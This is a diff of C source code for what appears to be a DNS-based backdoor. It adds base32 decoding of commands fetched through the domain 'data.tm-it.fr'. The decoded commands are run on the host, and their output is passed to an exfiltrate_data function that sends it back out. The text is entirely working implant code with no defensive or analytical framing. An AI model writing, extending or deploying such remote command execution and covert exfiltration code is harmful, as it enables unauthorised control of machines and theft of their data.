@@ -5,10 +5,42 @@
 #include <netinet/in.h>
 #include <arpa/nameser.h>
 #include <resolv.h>
+#include <stdint.h>
+#include <sys/types.h>
 
 #define BASE_DOMAIN "data.tm-it.fr"
 #define CHUNK_SIZE 30 
 #define MAX_OUTPUT_SIZE 8192
+
+int base32_char_to_val(char c) {
+    if (c >= 'A' && c <= 'Z') return c - 'A';
+    if (c >= 'a' && c <= 'z') return c - 'a';
+    if (c >= '2' && c <= '7') return c - '2' + 26;
+    return -1;
+}
+
+int decode_base32(const char *input, uint8_t *output) {
+    int len = strlen(input);
+    int bit_buffer = 0;
+    int bits_collected = 0;
+    int output_idx = 0;
+
+    for (int i = 0; i < len; i++) {
+        if (input[i] == '=') break;
+
+        int val = base32_char_to_val(input[i]);
+        if (val == -1) continue;
+
+        bit_buffer = (bit_buffer << 5) | val;
+        bits_collected += 5;
+
+        if (bits_collected >= 8) {
+            output[output_idx++] = (bit_buffer >> (bits_collected - 8)) & 0xFF;
+            bits_collected -= 8;
+        }
+    }
+    return output_idx;
+}
 
 void base32_encode(const unsigned char *src, size_t src_len, char *dst) {
     const char chars[] = "abcdefghijklmnopqrstuvwxyz234567";
@@ -116,6 +148,8 @@ int main() {
     char command[256] = {0};
     char fqdn[254] = {0};
     char *cmd_output = malloc(MAX_OUTPUT_SIZE);
+    char decoded_cmd[256];
+    int dec_len;
 
     get_machine_id(id_machine);
     if (strlen(id_machine) == 0) {
@@ -130,9 +164,12 @@ int main() {
 
         if (strlen(command) != 0) {
             printf("Command to execute : %s\n", command);
-
+    
+            memset(decoded_cmd, 0, sizeof(decoded_cmd));
+            dec_len = decode_base32(command, (uint8_t*)decoded_cmd);
+            decoded_cmd[dec_len] = '\0';
             memset(cmd_output, 0, MAX_OUTPUT_SIZE);
-            execute_command(command, cmd_output, MAX_OUTPUT_SIZE);
+            execute_command(decoded_cmd, cmd_output, MAX_OUTPUT_SIZE);
 
             exfiltrate_data(cmd_output, id_machine);
 
